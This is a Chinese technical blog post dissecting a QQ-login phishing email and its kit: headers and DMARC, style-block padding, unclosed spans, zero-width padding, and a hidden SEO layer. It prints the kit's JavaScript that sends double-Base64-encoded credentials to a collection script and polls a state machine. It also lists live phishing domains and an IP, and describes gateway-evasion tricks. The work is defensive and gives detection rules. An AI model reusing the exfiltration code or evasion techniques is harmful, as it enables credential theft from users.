---
title: 逐字节拆开那封 437 KB 的钓鱼邮件：头字段、DOM 统计与 kit 源码
description: MIME 树只有 text/html、dmarc=pass(p=NONE)、82.1% 的体积是 1485 个空 <style>、可见区 span 开 244 关 123、前导空白 382 字符交替排列、双层 Base64 61→84→112 字节、kit 前端 6 道初检与 state 状态机逐行
pubDate: 2026-11-18
tags: ['技术', '安全', '网络']
---

这是同一件事的第二篇。**科普版在[这里](/blog/20261118-phishing-email-anatomy/)**（四层伪装、三屏仿 QQ 登录、防骗指南），可点的交互版在 [`/apps/phishing-email/`](/apps/phishing-email/)。本文只谈可复现的技术细节：所有数字都是从 `.eml` 与 kit 源码里量出来的，附统计脚本。

样本：`51 View Row, Colorado Springs - Titan Bio (…@ethnolinguistically.ren) - 2026-11-18 1941.eml`，正文 HTML **437,491 字节 / 430,171 个 Unicode 码点**。

<mdui-card variant="outlined" style="margin-top:1.2rem">
<div style="display:flex;align-items:center;justify-content:space-between;gap:.9rem;flex-wrap:wrap;padding:.85rem 1.1rem">
  <div><div style="font-weight:600">相关页面</div><div style="font-size:.85rem;color:rgb(var(--mdui-color-on-surface-variant))">科普版（四层伪装与防骗指南）· 交互版（本地演示，零网络请求）</div></div>
  <div style="display:flex;gap:.5rem;flex-wrap:wrap">
    <mdui-button variant="tonal" href="/blog/20261118-phishing-email-anatomy/">科普版</mdui-button>
    <mdui-button variant="outlined" href="/apps/phishing-email/" target="_blank" rel="noopener">交互版</mdui-button>
  </div>
</div>
</mdui-card>

## MIME 树：没有 text/plain

```text
multipart/mixed; boundary="===============3785290013750153210=="
└─ multipart/alternative
   ├─ （无 text/plain）
   └─ text/html
附件：0 个
```

`multipart/mixed` 是为附件准备的容器，但这里一个附件都没有；真正要紧的是 `multipart/alternative` **只有一个 `text/html` 子部分**。

这意味着客户端**拿不到作者提供的纯文本版本**，只能自己现场做 HTML→文本的降级。降级做得好不好，直接决定这封信在你眼前长什么样——降级彻底（Thunderbird）只剩一个「请」字，降级保守（QQ 邮箱）就是 201 字加二维码。反过来说，如果作者真想给一份纯文本，他只要放一个 `text/plain` 子部分，就能保证所有客户端看到一致内容；**他没有这么做，因为统一可见对他不利**。

## 头字段

| 字段 | 值（部分截断） |
| --- | --- |
| `Date` | `Wed, 18 Nov 2026 19:41:17 +0800` |
| `Subject` | `=?utf-8?q?51_View_Row=2C_Colorado_Springs?=`（RFC 2047 Q 编码） |
| `From` | `Titan Bio <6m2nTVWEWzRdK3bMji@ethnolinguistically.ren>` |
| `Sender` | `bzth7hqzk@ethnolinguistically.ren` |
| `Reply-To` | `a13565220748@163.com` |
| `To` | `1901653141@qq.com` |
| `Message-ID` | `<600000375262452248.auto.1795002077@ethnolinguistically.ren>` |
| `DKIM-Signature` | `v=1; a=rsa-sha256; c=relaxed/relaxed; d=ethnolinguistically.ren; s=aliyun-cn-hangzhou` |
| `X-AliDM-RcptTo` | `MTcx…`（base64，解开即收件地址，此处略去） |

`Received` 链只有两跳：

```text
from 10.10.0.17(mailfrom:bzth7hqzk@ethnolinguistically.ren …)
     by smtpdm.aliyun.com(127.0.0.1); Wed, 18 Nov 2026 19:41
from out208-20.dm.aliyun.com [140.205.208.20]
     by newxmmxszc21-0.qq.com (NewMX) with SMTP id A52266B1
     for <收件人>                     ← 信封收件人，与 To 头无关
```

认证结果值得逐字读：

```text
Authentication-Results: mx.qq.com;
  spf=pass(140.205.208.20) smtp.mailfrom=…@ethnolinguistically.ren;
  dkim=pass(signature was verified) header.d=ethnolinguistically.ren;
  dmarc=pass(p=NONE sp=NONE pct=100)
```

<mdui-card variant="filled" style="margin-top:1rem">
<p style="margin:0"><mdui-icon-info style="width:1.15em;height:1.15em;color:rgb(var(--mdui-color-primary));vertical-align:-.22em"></mdui-icon-info> <strong>三条都 pass，但最后那半句 <code>p=NONE</code> 才是重点</strong>：该域的 DMARC 记录是 <code>p=none</code>，也就是「收报告、不处置」。<code>p=none</code> 下的 <code>dmarc=pass</code> 只说明「发信人对齐了」，不说明「策略上这个域可信」。加上 DKIM 选择器 <code>aliyun-cn-hangzhou</code> 是阿里云邮件推送的公共选择器，<strong>整套绿灯是攻击者在阿里云上开个域名就能自动获得的</strong>。</p>
</mdui-card>

DMARC 策略查询：

```bash
dig +short TXT _dmarc.ethnolinguistically.ren    # p=none 的话，pass 也就没什么分量
```

## 体积都花在哪：82.1% 是样式

按块统计正文 437,491 字节的去向：

| 部分 | 字节数 | 占比 |
| --- | ---: | ---: |
| 1,485 个 `<style>` 块合计 | **359,303** | **82.1%** |
| `.visually-hidden` 隐藏层 | 12,651 | 2.9% |
| 其余（载荷、零宽垫片、结构标签） | 65,537 | 15.0% |

单个 `<style>` 只有 **176–242 字节**，也就是说 1,485 个块里绝大多数是**空块或近乎空块**，纯粹占位。出现次数最多的一条规则：

```css
[data-ogsb] .blend_screen_black { background: #000000; mix-blend-mode: screen; }
```

**重复 1,484 次**；`[data-ogsb]` 标记全信出现 **4,452 次**，`mix-blend-mode` 同样 4,452 次。`data-ogsb` 是黑帽 SEO / 垃圾邮件工具包留下的指纹，`ogsb` 可以理解成工具链的署名。

这么做的收益有三层：

1. **撑大体积**——很多网关对超大邮件只取前 N KB 做检测，400 KB 样式足够把真正的正文挤出检测窗口；
2. **稀释关键词密度**——按词频统计，「开云体育」「保险」「中奖」这类词在整体文本里被稀释到阈值以下；
3. **拖慢沙箱**——解析 1,485 个样式块本身没有成本，但配合下面的 `mix-blend-mode` 会让渲染路径变复杂。

统计脚本：

```python
import re
styles = re.findall(r'<style[^>]*>([\s\S]*?)</style>', html)
total = len(html.encode())
print(len(styles), sum(len(s.encode()) for s in styles) / total)   # 1485  0.821
```

## DOM 统计与那个没闭合的 span

| 指标 | 全信 | 可见区（最后一个 `</style>` 之后） |
| --- | ---: | ---: |
| `<span`（开） | 245 | **244** |
| `</span>`（关） | 124 | **123** |
| 欠账 | 121 | **121** |
| `font-size:0` | 242 | 242 |
| `opacity:0` | 242 | 242 |
| `<style>` | 1,485 | — |
| `[data-ogsb]` | 4,452 | — |
| `clip:` | 1 | 0 |
| `U+200B` | 185 | 185 |

**121 个 span 没有闭合**。写法是这样：

```html
请<span style="font-size:0px;opacity:0;"><span>日文…</span><b>及</b><span>日文…</span><b>时</b>…
```

每对只关了里面那层，**外层从「请」字之后一路开到文件末尾**。后果取决于解析器：

| 客户端 | 行为 | 结果 |
| --- | --- | --- |
| Chromium / WebKit（QQ 邮箱、微信 webview） | 净化器会补闭合，或直接丢掉 `font-size:0` | 照常显示 201 字 |
| Gecko（Thunderbird） | 严格按 DOM 执行，未闭合 span 在 EOF 才隐式闭合 | 从「及」起全部继承 `font-size:0`，**只剩一个「请」字** |
| 纯文本转换 | 标签整体剥掉 | 隐藏层与日文全部现形，汉字与日文粘连 |

复现计数：

```bash
grep -o '<span[ >]' mail.html | wc -l      # 245
grep -o '</span>'    mail.html | wc -l      # 124
```

## 零宽垫片：382 个字符怎么骗过空白折叠

正文最前面是一段 382 字符的空白串，构成是 **185 个 `U+200B` + 197 个 `U+0020`**，模式长这样：

```text
Z__Z_Z_Z_Z_Z_Z_Z_Z_Z_Z_Z_Z_Z_Z_…    （Z = U+200B，_ = 普通空格）
首字符 Z，尾字符空格，其中 13 处出现连续双空格
```

HTML 会把**连续空白折叠成一个**，但这里每两个空格之间都夹着一个零宽字符——对折叠算法来说，那不是空白序列，于是 **197 个空格一个不少地渲染出来**，在 14.5px 字号下约 810px 宽。

除了顶开首屏，它还干两件事：**干扰鼠标框选**（选中的范围看起来比内容长）和**干扰复制**（粘贴出来是一串看不见的空白）。这些字符是真实字符，能被选中、能被复制、能被 `repr()` 打出来：

```python
lead = html[:html.index('<span class="')]
lead = ''.join(c for c in lead if c in ' \u200b')
print(len(lead), lead.count(' '), lead.count('\u200b'), repr(lead[:40]))
# 382 197 185 '\u200b  \u200b \u200b …'
```

## 隐藏层：12,651 字节装了什么

`.visually-hidden` 的定义只有一行狠的：

```css
.visually-hidden { clip: rect(0, 0, 0, 0); height: 1px; width: 1px; overflow: hidden; }
```

里面装的是（字符数 10,531 / 字节 12,651）：

- 一段**伪造的日文邮件头**（`From: "土屋ひより" <mail@example.jp>` 之类，与真实信头无关）；
- 整版「开云（Kaiyun）体育」**赌博 SEO 伪官网**：导航、产品、新闻、`沪ICP备18041948号`、地址电话；
- **2 张 HTML 表格、共 13 个 `<tr>`**（Employee 成绩表、项目进度跟踪表）；
- 一个门牌号地址。

这一层是给**搜索引擎**看的：CSS `clip` 对爬虫无效，抓取工具照样把文本抽走，于是这封垃圾邮件的域名在搜索结果里能蹭到「开云体育」的长尾词。对人眼它不存在，对机器它全在。

纯文本降级时，哪些标签会产生换行是关键——这决定了降级后的行数：

| 标签 | 纯文本里变成 |
| --- | --- |
| `</td>` `</th>` | 制表符（表格列） |
| `</tr>` `<br>` `</div>` `</p>` `</table>` | 换行 |
| 源码里的裸换行 | **空格**（渲染时本就会折叠） |
| `<style>…</style>` | 整块丢弃 |
| `<div></div>` 空块 | 不产生空行 |

按这张规则表降级，隐藏层是 25 行；整封信降级后 50 行左右——不是「437 KB 的字节全部变成文字」，而是**有效内容本来就没多少**。

**一处更正**：伪造引用头里的 `4041238849@edu.cn` 我最初当成真实受害者，查 DNS 后确认是编的：

```bash
dig +short MX edu.cn        # （空）
dig +short A edu.cn         # （空）
dig +short SOA edu.cn       # edu.cn. …dns.edu.cn.   ← 是个光杆域
dig +short MX qq.com        # mx1.qq.com mx2.qq.com mx3.qq.com  ← 正常域长这样
# 换 223.5.5.5、119.29.29.29 复核，结论一致
```

裸 `edu.cn` 根本不接邮件，地址不可能送达——**它是被写进模板里的**。另一个 `5656709175@qq.com` 格式合法、确实可投递，但真假无从判断。

## 可见载荷 201 字的构成

剥掉全部伪装后剩下的可见中文是 201 字，占 430,171 码点的 **0.0467%**：

```text
120 字真实载荷（9 段，1 个可见汉字 + 1 段隐形日文 成对交替）
 81 字伪造引用头（-----原始邮件----- 到 主题:）
---
201 字
```

结构之所以规整，是因为它就是**按「一个汉字 + 一段日文」的节拍生成的**：`请<日文>及<日文>时<日文>…`。这既保证了人类读起来是一句通顺的中文通知，又保证机器读起来是日文商务信。

图片只有 2 个 `<img>`，全信**远程 URL 也只有 2 个**：

```text
https://sendify.dingstore.com/material_content/image/d8d47793-…   ← 二维码
https://picabstract-preview-ftn.weiyun.com/ftn_pic_abs_v3/…        ← 微云预览缩略图 161×250
```

拦截远程图片会同时干掉这两张——二维码没了，「图片模糊看不清」的那张缩略图也没了，正文只剩文字，扫码入口直接消失。

## 双层 Base64：61 → 84 → 112 字节

kit 的 `b6()` 是 `btoa(unescape(encodeURIComponent(s)))`——UTF-8 转标准 Base64，**没有密钥、没有盐、没有压缩**。同一段 JSON 跑两遍：

```text
明文  61 B   {"act":"sv","data":{"user":"19990203","pass":"66ccff66ccff"}}
       ↓ b6()
一层  84 B   eyJhY3QiOiJzdiIsImRhdGEiOnsidXNlciI6IjE5OTkwMjAzIiwicGFzcyI6IjY2Y2NmZjY2Y2NmZiJ9fQ==
       ↓ b6()
两层 112 B   ZXlKaFkzUWlPaUp6ZGlJc0ltUmhkR0VpT25zaWRYTmxjaUk2SWpFNU9Ua3dNakF6SWl3aWNHRnpjeUk2SWpZMlkyTm1aalkyWTJObVppSjlmUT09
```

长度从 61 涨到 112，**78% 是编码开销**。关键在中间那一步：解一层得到的仍然是合法 Base64，而且**没有可读关键词**——这正是对付「扫到 base64 就解一层、再匹配 `user|pass|password`」的静态规则。这类规则的作者以为一层就够了，攻击者只需要多调一次函数。

```python
import base64
one = base64.b64decode(two).decode()      # 还是 Base64
print(base64.b64decode(one).decode())     # {"act":"sv","data":{…}}
```

## kit 前端：6 道初检与 state 状态机

`Login()` 在发凭据之前做 6 道本地检查，**全部不联网**、提示 3 秒消失（`.delay(3000).hide(0)`）：

| # | 条件 | 源码提示 | 动作 |
| --- | --- | --- | --- |
| 1 | `user === ''` | `您还没有输入帐号！` | 弹 3 秒 |
| 2 | `pass === ''` | `您还没有输入密码！` | 弹 3 秒 |
| 3 | `user.length < 6 \|\| > 11` | `您输入的帐号格式不正确，请重新输入。` | 清空账号框 |
| 4 | `pass.length < 6 \|\| > 16` | `您输入的密码格式不正确，请重新输入。` | 清空密码框 |
| 5 | `sameChar(user)` | 同 #3 | 拦下 + 清空 |
| 6 | `sameChar(pass)` | 同 #4 | 拦下 + 清空 |

配套的界面约束：

- 两个输入框 `maxlength` 分别是 **11 和 16**，`autocomplete="off"`；
- **密码框是 `readonly`**，必须用页面自带的屏幕键盘点——同时挡掉浏览器自动填充和物理键盘；
- 有个隐藏的 `domainText` 输入框（模板残留）；
- 登录按钮挂 `data-clipboard-text="##X-1DGhU9kYf1927U_R##"`，但页面**没有引入 clipboard 库**，这是个死属性，不会真写你的剪贴板；
- **没有正则校验纯数字**，账号填 `abcdef` 照样放行——它挡的是手滑，不是试探。

通过之后：

```js
function ds(act, data) {
  $.get('../app/data.php',
    'sv=' + encodeURIComponent(b6(b6(JSON.stringify({ act, data })))))
}
function rs(o) {
  window.rshand = setInterval(function () {
    $.post('../app/data.php', o, function (d) {
      if      (2  == d.state) jump('../step_in_fail/')
      else if (9  == d.state) jump('../step_phone/')
      else if (3  == d.state) jump('../step_code/')
      else if (28 == d.state) jump('../step_msg/')
      else if (5  == d.state) jump('../step_ok/')
    })
  }, 2500)
}
```

### C&C：转圈的那几秒，服务器在替你做决定

`state` 与页面的对应关系——**这就是 C&C 的全部协议**，一个 POST 拿一个数字，决定把你送进哪一屏：

| state | 跳转 | 你会看到什么 | 危险度 |
| --- | --- | --- | --- |
| `2 / 22` | `step_in_fail/` | 「未找到你的账号，请重新输入！」 | 低（编造号的下场） |
| `9` | `step_phone/` | 要你填手机号 | 中 |
| `3 / 35` | `step_code/` · `step_send/` | 发送 / 输入验证码 ← **拦截码，输码即失守** | 高 |
| `8 / 28` | `step_msg/` | 「支付校验 / 会员开通」 | 高（骗钱） |
| `5` | `step_ok/` | 「验证通过」，然后用真号真码登真账号 | 高（盗号完成） |

源码里最直白的一点是 **`3 / 35`（要验证码）与 `5`（验证通过）紧挨着**——先骗你把码交出来，再给你一句「验证通过」。**没有一个分支是「密码错了」**，因为它从不校验密码。

「一直转圈」就是 `rs()` 在轮询：**凭据在第一次轮询之前就已经发出去了**，转圈期间服务器在跑查号接口。还有个埋点 `cess/index.php?id=5`（486 字节）负责上报。整个 C&C 只有 `data.php` 一个入口，`sv` 传双层 Base64 的上报、`POST` 传轮询，**控制面与数据面合用一个脚本**，这也是这类 kit 的典型写法。

## 域名与解析：怎么验、验到什么

**验证方法与各自的依据**：

| 项 | 验证结果 | 依据 |
| --- | --- | --- |
| `ethnolinguistically.ren` 注册 | 2026-09-30，NS = `dns23/24.hichina.com` | RDAP（发信前 7 周） |
| `xmbjia.com` 注册 | 2026-01-10 | RDAP |
| `xmbjia.com` NS 变更 | **2026-11-15**（发信前 3 天） | RDAP |
| `xmbjia.com` 裸域 | 无 A 记录；只有子域解析到落地页 | `dig` |
| `edu.cn` 是否收信 | 无 MX、无 A、仅有 SOA | `dig`（对照 `qq.com`） |

裸域没有 A 记录、只有子域解析，是很典型的「只开落地页」配置；NS 在发信前 3 天变更，说明域名接管与发信是同一批动作。

```bash
dig +short NS xmbjia.com
dig +short A  zx.xmbjia.com
dig +short A  xmbjia.com     # 空 —— 裸域不解析
```

## 指标清单（IOC）

<mdui-card variant="outlined" style="margin-top:1rem">
<pre id="ioc-pre" style="margin:0;border:0;background:none">发信域      ethnolinguistically.ren
发件地址    bzth7hqzk@ethnolinguistically.ren
回信地址    a13565220748@163.com
钓鱼域      zx.xmbjia.com
钓鱼页      https://zx.xmbjia.com/step_in/
钓鱼 IP     154.64.247.193
凭据回收    /app/data.php?sv=&lt;双层 base64&gt;
轮询上报    /app/data.php（POST，2500ms 间隔）
埋点        /cess/index.php?id=5（486 B）
二维码源图  sendify.dingstore.com/material_content/image/d8d47793-…
伪造引用头  5656709175@qq.com → 4041238849@edu.cn（后者域无 MX，编的）
kit 指纹    EcCensus v11 / data-ogsb ×4452</pre>
<div style="padding:.75rem 1.1rem;border-top:1px solid rgb(var(--mdui-color-outline-variant))">
  <mdui-button variant="tonal" onclick="navigator.clipboard.writeText(document.getElementById('ioc-pre').textContent);this.textContent='已复制'">复制全部指标</mdui-button>
</div>
</mdui-card>

## 时间线

<mdui-list style="border-radius:var(--mdui-shape-corner-medium);border:1px solid rgb(var(--mdui-color-outline-variant))">
  <mdui-list-item nonclickable headline="2026-01-10　xmbjia.com 注册" description="钓鱼落地域，NS 之后会换"></mdui-list-item>
  <mdui-list-item nonclickable headline="2026-08-24　钓鱼页静态资源 data.js 最后修改"></mdui-list-item>
  <mdui-list-item nonclickable headline="2026-09-30　ethnolinguistically.ren 注册" description="发信域，NS = 阿里云 hichina"></mdui-list-item>
  <mdui-list-item nonclickable headline="2026-11-15　xmbjia.com NS 变更" description="发信前 3 天完成落地配置" style="background:rgb(var(--mdui-color-error-container))"></mdui-list-item>
  <mdui-list-item nonclickable headline="2026-11-17　伪造的发信日期" description="模板里写死的假历史" style="background:rgb(var(--mdui-color-error-container))"></mdui-list-item>
  <mdui-list-item nonclickable headline="2026-11-18 19:41　阿里云邮件推送 → QQ 邮箱" description="SPF / DKIM / DMARC 全 pass（p=NONE）" style="background:rgb(var(--mdui-color-error-container))"></mdui-list-item>
</mdui-list>

## 可复用的检测思路

给邮件网关或本地批量筛查用的几条，都是只看内容、不需要外部情报：

```python
import re, base64

def score(html: str) -> dict:
    return {
        'unclosed_span': html.count('<span') - html.count('</span>'),
        'invisible_text': len(re.findall(r'font-size:\s*0', html)),
        'clipped_block':  bool(re.search(r'clip:\s*rect\(', html)),
        'ogsb_fingerprint': html.count('[data-ogsb]'),
        'style_ratio': sum(len(m.encode()) for m in
                           re.findall(r'<style[^>]*>[\s\S]*?</style>', html))
                       / max(len(html.encode()), 1),
        'zwsp': html.count('\u200b'),
        'img_count': len(re.findall(r'<img[\s>]', html)),
        'qr_param_looks_base64': bool(
            re.search(r'[?&]sv=([A-Za-z0-9+/]{40,}={0,2})', html)),
    }
```

判别阈值（这封信的实测值）：

```text
unclosed_span ≥ 100          → 121
invisible_text ≥ 50          → 242
clipped_block                → True（1px + clip:rect）
ogsb_fingerprint ≥ 100       → 4,452
style_ratio > 0.5            → 0.821
zwsp ≥ 50                    → 185
img_count ≤ 2 且含 QR 域名   → 2
sv= 参数可解一层且仍是 Base64 → True
```

<mdui-card variant="filled" style="margin-top:1rem">
<p style="margin:0"><mdui-icon-check-circle style="width:1.15em;height:1.15em;color:rgb(var(--mdui-color-primary));vertical-align:-.22em"></mdui-icon-check-circle> <strong>最后一条最有用</strong>：对 URL 里疑似 Base64 的参数解一层，<strong>如果结果仍是 Base64，就直接标记</strong>。这条规则不需要知道攻击者的域名，也就不怕换域。</p>
</mdui-card>

再配合两条基于头的观察：`multipart/alternative` 里**没有 `text/plain`**，以及 `Authentication-Results` 是 `dmarc=pass(p=NONE)`——单独看都不足以定罪，叠在一起就是很浓的味道。

## 更正与边界

- 我在科普版里写过「前端只查非空」，**是错的**：它有 6 道本地检查。两篇都已改口径。
- 我在科普版里把 `4041238849@edu.cn` 当成真实受害者，**也是错的**：`edu.cn` 无 MX、无 A，地址必为模板编造。两篇都已标注。
- 分析原站时只发起过**只读 GET**（静态页面与脚本），未提交任何表单数据；这些请求可能在对方服务器留下本机 IP 的访问日志。整封 `.eml` 已提交举报。
- 交互版 [`/apps/phishing-email/`](/apps/phishing-email/) 是本地教学仿制品，**零网络请求**，已加 `noindex,nofollow`；本文与其互相独立，读文字版就够。